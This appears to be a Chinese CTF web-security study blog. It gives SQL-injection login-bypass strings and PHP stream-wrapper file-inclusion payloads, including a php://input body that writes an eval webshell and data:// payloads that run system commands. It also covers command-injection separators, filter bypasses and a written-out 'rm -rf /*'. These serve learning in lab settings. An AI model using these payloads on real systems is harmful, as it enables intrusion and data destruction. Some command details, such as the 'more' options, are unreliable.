---
title: CTF Web安全学习笔记
date: 2024-09-09
tags: [Web安全, CTF, PHP, 渗透测试, 学习笔记]
---

# PHP 的备份文件后缀名

##### .git .swn .swp .\~ .bak .bash_history .bkf ;


<!-- more -->
**使用方法：在浏览器的 url 中输入(上述后缀名即可)；**

**另外的思路：通过路径扫描，在 kali 中，使用 dirseach 的工具，输入指令 \~u+网址，即可扫描所有的页面。**

---

# 万能密码

## 举个例子：

**提示**：我们所有的表单的值都在 url 栏进行传输，网址后缀就是我们传输的表单元素的内容，传递进数据库进行查询，并返回结果。

后台数据库的登录语句：select \* from user where username\='user' and password\='pass'

web 会将传进去的参数带入到数据库中进行查询，并且回显。

假设用户名是 admin，我们就给用户名填上 admin '#，密码随便输入，比如 123456，后台接收参数，拼接到 SQL 中会变成这样：

```MySQL
select * from user where username='admin'#' and password='123456'
```

由于  #  在 SQL 中是注释符，注释符后面的内容不起作用，所以真正执行的 SQL 大概是下面这样

    select * from user where username='admin'

SQL 只会在数据库中查询用户名，而不是同时查询用户名和密码，这就意味着，只要用户名正确，就可以登录成功。

也就是说万能密码并不是一个真正意义上的密码，而是一种拥有不同变体的格式。

由于参数可以用双引号包裹、单引号包裹、甚至不包裹，万能密码可以有三种形式：

- 数值型：`admin #`

- 单引号字符串型：`admin'#`

- 双引号字符串型：`admin"#`

这实际上是利用了注释  `#`  的特性，由于`--`也是 SQL 的注释，万能密码又多了三种形式：

- 数值型：`admin-- a`

- 单引号字符串型：`admin'-- a`

- 双引号字符串型： `admin"-- a`

`--`后面还有一个空格，这个空格是必须要有的，因为 SQL 的语法格式规定`--`和后面的注释内容必须间隔一个空格。

---

# Cookie

cookie 的中文翻译是曲奇，小甜饼的意思。cookie 其实就是一些数据信息，类型为“**小型文本文件**”，存储于电脑上的文本文件中。

简单来说，键值对的存储。

作用：用于解决 "如何记录客户端的用户信息"。

1.  当用户访问 web 页面时，他的信息可以记录在 cookie 中。

2.  在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录。

## **Cookie 的生命周期**

## Cookie 有 2 种存储方式，一种是会话性，一种是持久性。

- 会话性：如果 Cookie 为会话性，Cookie 仅会保存在客户端的内存中，当关闭客服端时 Cookie 也就失效了

- 持久性：如果 Cookie 为持久性，Cookie 会保存在用户的硬盘中，直至生存期结束或者用户主动将其销毁。

Cookie 是可以进行设置的，可以人为设置 cookie 的有效时间，什么时候创建，什么时候销毁。

![https://gitee.com/jerry798/xcximg/raw/master/img/46728a30-815c-11ee-94b5-71a3fbff1de4_20231112210620.jpeg&token=V1%3APnkg6WVD5ptO6kZ5s2GtfjKu2Yd09T7W1l1nT72fTDE)

---

# PHP 伪协议

PHP 支持的伪协议：

| file://   | 访问本地文件系统                   |     |
| :-------- | :--------------------------------- | :-- |
| http\://  | 访问 HTTP（s）网址                 |     |
| ftp\://   | 访问 FTP（s）URLs                  |     |
| php\://   | 访问各个输入/输出流（I/O streams） |     |
| zlib://   | 压缩流                             |     |
| data://   | 数据（RFC 2397）                   |     |
| glob://   | 查找匹配的文件路径模式             |     |
| phar://   | PHP 归档                           |     |
| ssh2://   | Secure shell 2                     |     |
| rar://    | RAR                                |     |
| ogg://    | 音频流                             |     |
| expect:// | 处理交互的流                       |     |

## `file://`  协议

- **条件**：

  - `allow_url_fopen`:off/on

  - `allow_url_include` :off/on

- **作用**：\
  用于访问本地文件系统，在 CTF 中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。\
  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照 php 语法进行解析，这是`include()`函数所决定的。

- **说明**：\
  `file://`  文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如  `fopen()`  和  `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。

- **用法**：

      /path/to/file.ext
      relative/path/to/file.ext
      fileInCwd.ext
      C:/path/to/winfile.ext
      C:\path\to\winfile.ext
      \\smbserver\share\path\to\winfile.ext
      file:///path/to/file.ext

- **示例**：

  1.  `file://[文件的绝对路径和文件名]`

          http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt

      ![图片描述](https://segmentfault.com/img/bVbrQAZ '图片描述')

  2.  `[文件的相对路径和文件名]`

          http://127.0.0.1/include.php?file=./phpinfo.txt

      ![图片描述](https://segmentfault.com/img/bVbrQA1 '图片描述')

  3.  `[http：//网络路径和文件名]`

          http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt

      ![图片描述](https://segmentfault.com/img/bVbrQBb '图片描述')

- **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=uBLVZAMwYqW6aAbznuAwug%3D%3D.22aDE2%2BH08r2rOqCGRyU%2FkgttEcz611q0H3VbvLPSgtBgGpaowuutYtv1OOq7kA9)

## `php://`  协议

- **条件**：

  - `allow_url_fopen`:off/on

  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要 on

- **作用**：\
  `php://`  访问各个输入/输出流（I/O streams），在 CTF 中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行 php 代码**。

- **说明**：\
  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，\
  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

  | **协议**                  | **作用**                                                                                                                                                                                                                                                  |
  | ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
  | php\://input              | 可以访问请求的原始数据的只读流，在 POST 请求中访问 POST 的`data`部分，在`enctype="multipart/form-data"`  的时候`php://input `是无效的。                                                                                                                   |
  | php\://output             | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。                                                                                                                                                                                           |
  | php\://fd                 | (>\=5.3.6)允许直接访问指定的文件描述符。例如  `php://fd/3`  引用了文件描述符 3。                                                                                                                                                                          |
  | php\://memory php\://temp | (>\=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是  `php://memory`  总是把数据储存在内存中，而  `php://temp`  会在内存量达到预定义的限制后（默认是  `2MB`）存入临时文件中。临时文件位置的决定和  `sys_get_temp_dir()`  的方式一致。 |
  | php\://filter             | (>\=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似  `readfile()`、`file()`  和  `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。                                           |

- `php://filter`参数详解

  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：

  | **php\://filter 参数**     | **描述**                                                                        |            |
  | -------------------------- | ------------------------------------------------------------------------------- | :--------- |
  | resource\=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                                          |            |
  | read\=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（\*\\                            | \*）分隔。 |
  | write\=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\\                              | ）分隔。   |
  | <; 两个链的过滤器>         | 任何没有以  *read\=*  或  *write\=*  作前缀的筛选器列表会视情况应用于读或写链。 |            |

- **可用的过滤器列表（4 类）**

  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=X3IaVPoVOaCS5Q1DJYzjtw%3D%3D.mwHiIlbcaFFBAz7HPsYwX3%2BxYHxjtOK%2BxF0LkdWk0OXBIxG4laaf5AjVCb2VVsoH)

  | **字符串过滤器**  | **作用**                                      |
  | ----------------- | --------------------------------------------- |
  | string.rot13      | 等同于`str_rot13()`，rot13 变换               |
  | string.toupper    | 等同于`strtoupper()`，转大写字母              |
  | string.tolower    | 等同于`strtolower()`，转小写字母              |
  | string.strip_tags | 等同于`strip_tags()`，去除 html、PHP 语言标签 |

  | **转换过滤器**                                                    | **作用**                                                    |
  | ----------------------------------------------------------------- | ----------------------------------------------------------- |
  | convert.base64-encode & convert.base64-decode                     | 等同于`base64_encode()`和`base64_decode()`，base64 编码解码 |
  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码              |

  | **压缩过滤器**                    | **作用**                                                                                                                 |
  | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip 的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。                                                                          |

  | **加密过滤器** | **作用**               |
  | -------------- | ---------------------- |
  | mcrypt.\*      | libmcrypt 对称加密算法 |
  | mdecrypt.\*    | libmcrypt 对称解密算法 |

- **示例**：

  1.  `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对 php 文件需要 base64 编码）

          http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php

      ![图片描述](https://segmentfault.com/img/bVbrQBf '图片描述')

  2.  `php://input + [POST DATA]`执行 php 代码

          http://127.0.0.1/include.php?file=php://input
          [POST DATA部分]
          <?php phpinfo(); ?>

      ![图片描述](https://segmentfault.com/img/bVbrQBh '图片描述')

      若有写入权限，写入一句话木马

          http://127.0.0.1/include.php?file=php://input
          [POST DATA部分]
          <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>

      ![图片描述](https://segmentfault.com/img/bVbrQBi '图片描述')

- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=vMfUrQA%2Bx5DtN6lihcwURw%3D%3D.1cEEKV2AbqeH90%2BlnOSp%2F9kRfQLbzrSN7h6H24BawHlAv23Rdj73zgyfesH2HyDr)

## `zip:// & bzip2:// & zlib://`  协议

- **条件**：

  - `allow_url_fopen`:off/on

  - `allow_url_include` :off/on

- **作用**：`zip:// & bzip2:// & zlib://`  均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx`  等等。

- **示例**：

  1.  `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）

      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传

          http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt

      ![图片描述](https://segmentfault.com/img/bVbrQBj '图片描述')

  2.  `compress.bzip2://file.bz2`

      压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）

          http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2

      ![图片描述](https://segmentfault.com/img/bVbrQBt '图片描述')

  3.  `compress.zlib://file.gz`

      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

          http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz

      ![图片描述](https://segmentfault.com/img/bVbrQBu '图片描述')

- **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=PRpuCWBJw%2FWNs%2BekVvws0w%3D%3D.idVqG6KJ%2Frr2BIVU%2Fq2SNIEPVVCl%2BuMatjlPCky9paiOrW16LZZpNijHP1%2FZ5WzPx5oFBEWVIyNHvcSkusdHeA%3D%3D)

## `data://`  协议

- **条件**：

  - `allow_url_fopen`:on

  - `allow_url_include` :on

- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行 PHP 代码。

- **用法**：

      data://text/plain,
      data://text/plain;base64,

- **示例**：

  1.  `data://text/plain,`

          http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
          <?php%20show_source('flag.php')?>
          <?=system("tac f*");?>

      ![图片描述](https://segmentfault.com/img/bVbrQBB '图片描述')

  2.  `data://text/plain;base64,`

          http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

      ![图片描述](https://segmentfault.com/img/bVbrQBD '图片描述')

## `http:// & https://`  协议

- **条件**：

  - `allow_url_fopen`:on

  - `allow_url_include` :on

- **作用**：常规 URL 形式，允许通过  `HTTP 1.0`  的 GET 方法，以只读访问文件或资源。CTF 中通常用于远程包含。

- **用法**：

      http://example.com
      http://example.com/file.php?var1=val1&var2=val2
      http://user:password@example.com
      https://example.com
      https://example.com/file.php?var1=val1&var2=val2
      https://user:password@example.com

- **示例**：

      http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt

  ![图片描述](https://segmentfault.com/img/bVbrQBP '图片描述')

## `phar://`  协议

`phar://`协议与`zip://`类似，同样可以访问 zip 格式压缩包内容，在这里只给出一个示例：

    http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt

![图片描述](https://segmentfault.com/img/bVbrQBX '图片描述')一款针对 PHP 应用程序的全新攻击技术：**phar://协议对象注入技术**。

---

# SECRET_KEY (Flask 笔记)

- SECRET_KEY 配置变量是通用密钥，可在 Flask 和多个第三方扩展中使用。如其名所示，加密的强度取决与变量值的机密度。不同的程序使用不同的密钥，而且要保证其他人不知道你所用的字符串。

- SECRET_KEY 的作用主要是提供一个值做各种 HASH, 在加密的过程中作为算法的一个参数（salt 或其他），所以这个值的复杂度也就影响到了数据传输和存储时的复杂度。

- 考虑到安全性，这个密钥不建议存储在你的程序中，最好的方法是存储在你的系统环境变量中

  - 存储在程序中的方法：app.config \['SECRET_KEY']\='hard to guess string'

  - 存储在系统环境变量中的方法：set SECRET_KEY\=hard to guess string

  - 通过 os.environ.get ('SECRET_KEY') 获取密钥

  ***

# Windows 通用管道符

Windows 和 Linux 通用的命令分隔符%0a、| 、& ；

Windows 特有的命令 dir；

常用的空格绕过方法

> `$IFS`
>
> `IFS*6                               ——后面的数字6换成其他数字也行`
>
> `${IFS}`
>
> `<`
>
> `<>`
>
> `{cat,flag.php}                      ——这里把，替换成了空格键`
>
> `%20                                     ——代表space键`
>
> `%09                                     ——代表Tab键`

- 概念：IFS（Internal Filed Separator，内部域分隔符）是一个 set 变量（shell 变量），**_==默认是空格、Tab 键、换行符==_**，使用 for 循环读取值列表时，会根据 IFS 的值判断列表中值的个数。

- IFS 的多个值之间是“或”的关系

  ***

# 科普一下：burpsuite 各项参数的意思

![https://gitee.com/jerry798/xcximg/raw/master/img/7f85f7e0-c8eb-11ee-8cf6-55bfe6dcf2ab_20240211224027.jpeg&token=V1%3AXAJUphfBPniJ3q3oPPVE-Ff85Yu5xMjBOFGhNsmpUEc)

---

# upload 上传漏洞

什么是 GIF89a

- 一个 GIF89a 图形文件就是一个根据图形交换格式（GIF）89a 版（1989 年 7 月发行）进行格式化之后的图形。在 GIF89a 之前还有 87a 版（1987 年 5 月发行），但在 Web 上所见到的大多数图形都是以 89a 版的格式创建的。 89a 版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态 GIF 是一个 以 GIF89a 格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。

---

# .htaccess 是什么

## 分布式配置文件

&#x20;.htaccess 文件（或者分布式配置文件），全称是 Hypertext Access（超文本入口）。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。

## 解析

概述来说，htaccess 文件是 apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页[301 重定向](https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91/1135400?fromModule=lemma_inlink)、自定义[404 错误页面](https://baike.baidu.com/item/404%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2/583066?fromModule=lemma_inlink)、改变[文件扩展名](https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/1270230?fromModule=lemma_inlink)、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

Unix、[Linux](https://baike.baidu.com/item/Linux/27050?fromModule=lemma_inlink)系统或者是任何版本的 Apache Web 服务器都是支持.htaccess 的，但是有的主机服务商可能不允许你自定义自己的.htaccess 文件。

启用.htaccess，需要修改[httpd.conf](https://baike.baidu.com/item/httpd.conf/5544111?fromModule=lemma_inlink)，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。如果需要使用.htaccess 以外的其他文件名，可以用 AccessFileName 指令来改变。例如，需要使用.[config](https://baike.baidu.com/item/config/10621054?fromModule=lemma_inlink) ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。

笼统地说，.htaccess 可以帮我们实现包括：文件夹[密码保护](https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E4%BF%9D%E6%8A%A4/1194733?fromModule=lemma_inlink)、用户自动重定向、自定义错误页面、改变你的[文件扩展名](https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/0?fromModule=lemma_inlink)、封禁特定[IP 地址](https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80/150859?fromModule=lemma_inlink)的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。

## 工作

.htaccess 文件（或者"分布式[配置文件](https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550?fromModule=lemma_inlink)"）提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有[子目录](https://baike.baidu.com/item/%E5%AD%90%E7%9B%AE%E5%BD%95/4728026?fromModule=lemma_inlink)。

### 说明

如果需要使用.htaccess 以外的其他文件名，可以用 AccessFileName 指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：

AccessFileName .config

通常，.htaccess 文件使用的配置语法和主配置文件一样。AllowOverride 指令按类别决定了.htaccess 文件中哪些指令才是有效的。如果一个指令允许在.htaccess 中使用，那么在本手册的说明中，此指令会有一个覆盖项段，其中说明了为使此指令生效而必须在 AllowOverride 指令中设置的值。

例如，本手册对 AddDefaultCharset 指令的阐述表明此指令可以用于.htaccess 文件中（见"[作用域](https://baike.baidu.com/item/%E4%BD%9C%E7%94%A8%E5%9F%9F/10944767?fromModule=lemma_inlink)"项），而覆盖项一行是 FileInfo ，那么为了使.htaccess 中的此指令有效，则至少要设置 AllowOverride FileInfo 。

### \[优缺点

采用.htaccess 文件的优缺点：

通常[网络管理员](https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%91%98/595848?fromModule=lemma_inlink)采用.htaccess 文件来进行[用户组](https://baike.baidu.com/item/%E7%94%A8%E6%88%B7%E7%BB%84/3456122?fromModule=lemma_inlink)的目录权限[访问控制](https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/8545517?fromModule=lemma_inlink)。没有必要将所有的 HTTPd 服务器、配置文件以及目录[访问权限](https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/6533727?fromModule=lemma_inlink)全部授权给管理员。利用[当前目录](https://baike.baidu.com/item/%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95/7205107?fromModule=lemma_inlink)的.htaccess 文件可以允许管理员灵活的随时按需改变目录访问策略。

采用.htaccess 的缺点在于：当系统有成百上千个目录，每个目录下都有对应的.htaccess 文件时，网络管理员将会对如何配置全局访问策略无从下手。同时，由于.htaccess 文件十分被容易覆盖，很容易造成用户上一时段能访问目录，而下一时段又访问不了的情况发生。最后，.htaccess 文件也很容易被非[授权用户](https://baike.baidu.com/item/%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7/56126873?fromModule=lemma_inlink)得到，安全性不高。

启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。如果需要使用.htaccess 以外的其他文件名，可以用 AccessFileName 指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config&#x20;

_==笼统地说，.htaccess 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定 IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能==_==。]==

---

# 常用的端口号

1.  端口号：21\
    FTP：文件传输协议，用于上传和下载。

2.  &#x20;端口号：22\
    SSH：安全外壳协议，为网络或远程登陆会话等提供的安全协议。

3.  端口号：23\
    Telnet：远程登陆协议，是常用的远程控制 web 服务器的方法

4.  端口号：25\
    SMTP：简单的邮件传输协议，可指定收信人的服务器。

5.  端口号：69\
    TFTP：简单文件传输协议，进行简单/开销不大的文件传输。

6.  端口号：80/8080\
    HTTP：超文本传输，用于浏览网页。

7.  端口号：110\
    POP3：邮件协议，简化了用户操作，不需参与邮件的读取过程，可离线处理。

8.  端口号：161\
    SNMP：简单网络管理协议

9.  端口号：443\
    HTTPS：加密的 HTTP 协议

10. 端口号：53\
    DNS：域名解析

11. 端口号：3306

    mysql 默认端口号

12. 端口号：3389

    3389 端口是 Windows 2000(2003) Server 远程桌面的服务端口，可以通过这个端口，用"远程桌面"等连接工具来连接到远程的服务器，如果连接上了，输入系统管理员的用户名和密码后，将变得可以像操作本机一样操作远程的电脑，因此远程服务器一般都将这个端口修改数值或者关闭。

13. 端口号：1443

    1433 端口是 SQL Server 默认的端口，SQL Server 服务使用两个端口，分别是 TCP-1433、UDP-1434。1433 端口用于供 SQL Server 对外提供服务，1434 用于向请求者返回 SQL Server 使用了哪个 TCP/IP 端口。一般而言，SQL Server 使用端口 1433 作为默认端口，但当客户端应用程序不需要连接上到 SQL Server 数据库时，它会可以使用该端口与数据库服务器确立连接到。

14. 端口号：6379

    Redis 数据库服务，6379 端口是 Redis 数据库服务的默认端口。

    通过这个端口，客户端可以与 Redis 数据库建立连接并进行数据操作。这个端口主要用于与客户端建立连接和进行数据传输。虽然有些端口可能因为它们被网络攻击者经常利用而被认为是高危端口，但 6379 端口并不属于高危端口。

---

# PHP 弱类型比较

还没填充

---

# **什么是 chmod**

`chmod`  命令可以用来修改用户对某个文件活文件夹的权限

`Linux`  系统中，文件的基本权限由  `9`  个字符组成，以  `rwxrw-r-x`  为例，我们可以使用数字来代表各个权限，各个权限与数字的对应关系如下：

    r --> 4
    w --> 2
    x --> 1

拿  `rwxrw-r-x`  来说，所有者、所属组和其他人分别对应的权限值为：(计算权限值)

` 所有者 = rwx = 4+2+1 = 7````所属组 = rw- = 4+2 = 6````其他人 = r-x = 4+1 = 5 `

所以，此权限对应的权限值就是  `765`。

`r`、`w`、`x`  分别表示读、写、执行权限

## **如何修改文件权限**

如修改  `/etc/hosts`  文件

- 查看修改前  `/etc/hosts`，如图所示只有所有者有权限操作  `/etc/hosts`  文件

<!---->

    ls -la /etc/hosts

![图片](https://mmbiz.qpic.cn/mmbiz_png/ERvc7u4McBfjp00k61ZichD1nCglYaLJuPa7Uja2iaOwtibbhAoqTKLLd6LjVVd12mfIquG4XEmDjG7FYxqUGIYIg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 这时我们想让其他人有权限操作  `/etc/hosts`，执行以下命令

<!---->

    sudo chmod 707 /etc/hosts

![图片](https://mmbiz.qpic.cn/mmbiz_png/ERvc7u4McBfjp00k61ZichD1nCglYaLJuCW3jr6zPU8svd7ibuSKbwSNA4JWov4FZUZUgeWCOTSdh2CZqiaglKJKA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 可以发现权限变成了  `rwx---rwx`，其他人也有权限操作  `/etc/hosts`  了

## **操作文件夹**

需要加入 -R 参数

    sudo chmod -R 707 [所要操作的文件夹名称]

## **使用字母修改文件权限**

首先权限的  `3`  种用户身份所有者、所属组和其他人分别用字母代表  `u`、 `g`、 `o` ，其次  `a`  代表所有身份。

### **修改示例**

表示 所有者（`u`）的权限为  `rwx`

    sudo chmod u=rwx /etc/hosts

表示 所有者（`u`）的权限增加  `r`

    sudo chmod u+r /etc/hosts

表示 所有者（`u`）的权限增加  `rx`

    sudo chmod u+rx /etc/hosts

表示 所有者（`u`）的权限取消  `x`

    sudo chmod u-x /etc/hosts

多个命令一起操作用  `，`  进行分割

    sudo chmod u-x,o+rw /etc/hosts

---

# （科普一下）bitlocker

Windows BitLocker 驱动器加密通过加密 Windows 操作系统卷上存储的所有数据可以更好地保护计算机中的数据。BitLocker 使用 TPM（受信任的平台模块）帮助保护 Windows  操作系统和用户数据，并帮助确保计算机即使在无人参与、丢失或被盗的情况下也不会被篡改。 BitLocker 还可以在没有 TPM 的情况下使用。若要在计算机上使用 BitLocker 而不使用 TPM，则必须通过使用组策略更改 BitLocker 安装向导的默认行为，或通过使用脚本配置 BitLocker。使用 BitLocker 而不使用 TPM 时，所需加密密钥存储在 USB 闪存驱动器中，必须提供该驱动器才能解锁存储在卷上的数据。

BitLocker 驱动器加密它是在 Windows Vista 中新增的一种数据保护功能，主要用于解决一个人们越来越关心的问题：由计算机设备的物理丢失导致的数据失窃或恶意泄漏。随同 Windows Server 2008 一同发布的有 BitLocker 实用程序，该程序能够通过加密逻辑驱动器来保护重要数据，还提供了系统启动完整性检查功能。

受信任的平台模块(TPM)是一个内置在计算机中的微芯片。它用于存储加密信息，如加密密钥。存储在 TPM 上的信息会更安全，避免受到外部软件攻击和物理盗窃。BitLocker 使用 TPM 帮助保护 Windows 操作系统和用户数据，并帮助确保计算机即使在无人参与、丢失或被盗的情况下也不会被篡改。BitLocker 可加密存储于 Windows 操作系统卷上的所有数据，默认情况下，使用 TPM 以确保早期启动组件的完整性（组件用于启动进程的更早时期），以及“锁定”任何 BitLocker 保护卷，使之即便在计算机受到篡改时也能得到保护。

但是 BitLocker 有一项不足，即打开加密盘后，再次进入就不需要密码了。那么如何才能使每次访问加密盘都要密码呢？这恐怕是微软后续改进的问题了，但是目前，我们可以在开始任务栏里输入“cmd”，然后以管理员身份运行，输入 manage-bde（空格）-lock（空格）X：，x 为加密磁盘盘符。这样就可以再次锁住加密盘了。

---

# PHP 序列化和反序列化

链接自己看：<https://www.cnblogs.com/xhds/p/12233720.html>

链接自己看：<https://www.cnblogs.com/xhds/p/12243760.html>

# 瞎写的东西

至于\`（反引号）的用途，在 PHP 中，它们被用作执行外部命令的简写方式，类似于 shell 中的命令替换。

在 url 中%09 表示为 tab 制表符。

cat f\* 是一个在 Unix/Linux 命令行环境中使用的命令，它利用了 shell 的通配符（wildcard）功能。这个命令的作用是将当前目录下所有以字母 "f" 开头的文件的内容串联起来，并通过标准输出（通常是终端或命令行界面）显示出来。

tac cat 的逆序输出

删库：rm-rf /\*

正则表达式的匹配：confi\[g]\[!0-9]ph\[p] 这里的\[!0-9]用于匹配 ASCIIi 不在 0 到 9 之间的数，能匹配到符号.(点) （比如说：禁用了 php 和 config） 中括号绕过

当；被过滤，可以使用?>来代替

解释一个命令： grep 是一种强大的文本搜索工具，它允许你搜索文件中匹配指定模式的行，并将这些行打印出来。grep 的名称来源于全局正则表达式打印（Global Regular Expression Print）的缩写，尽管其功能已经远远超出了这个简单的描述。

grep 使用正则表达式作为搜索条件，这使得它非常灵活和强大。你可以用它来搜索文件中的文本、数字、特定的字符序列等。此外，grep 还支持许多选项，以便你更精确地控制搜索行为，比如忽略大小写、只显示匹配的行号、递归搜索目录等。

grep 的基本语法如下：

bash grep \[选项]... 模式 \[文件]...

    [选项]...：这是可选的，grep 提供了许多选项来定制其行为。
    模式：这是你希望搜索的文本模式，可以使用正则表达式来指定。
    [文件]...：这是你想要搜索的文件列表。如果省略文件列表，grep 会从标准输入（stdin）读取数据。

例如，要在文件 example.txt 中搜索包含单词 "hello" 的行，你可以使用以下命令：

bash grep "hello" example.txt

grep 是 Linux 和 Unix 系统中不可或缺的工具之一，也是许多文本处理和数据挖掘任务中的关键工具。由于其灵活性和高效性，它被广泛用于脚本编程、日志文件分析、源代码审查等领域。

解释一个命令： 在 Linux 系统中，more 命令的意思是“显示一页内容”，它是一个用于分页查看文件内容的命令。当需要查看较长文件内容时，使用 more 命令可以一屏一屏地逐步显示文件内容，帮助用户更方便地阅读文件。以下是 more 命令的详细解释： 基本用法

    命令格式：more [选项] 文件名。其中，选项是可选的，而文件名参数表示要显示内容的文件名。
    基本功能：将文件内容分成一页一页进行显示，每次显示一页内容。用户可以通过空格键或回车键来逐页或逐行查看文件内容。

常用功能

    分页显示：more命令将文件内容分成一页一页进行显示，用户可以通过空格键或回车键来控制翻页。
    快速定位：
        使用/键加上关键词可以在文件内容中进行关键词搜索，并显示匹配的内容。
        按下n键可以跳转到下一个匹配结果，进行连续搜索。
        按下g键可以跳转到文件的开头，按下G键可以跳转到文件的末尾。
    命令提示符：当文本超过一屏时，more命令会在屏幕底部显示一个冒号（:）作为命令提示符，用户可以使用不同的命令来执行操作，如输入q退出more命令。
    倒序显示：使用-r选项可以倒序显示文本内容，这在需要从底部向上查看文件内容时非常有用。
    显示行号：使用-n参数可以在文件内容的每一行前面显示行号，方便用户定位。
    管道操作：more命令可以通过管道符|与其他命令结合使用，如cat file.txt | more，将文件内容输出到more命令进行分页显示。

快捷键支持

    空格键：向下滚动一页。
    回车键：向下滚动一行。
    b键：向上滚动一页。
    q键：退出more命令。
    /键：进入搜索模式，输入关键词后按回车键进行搜索。
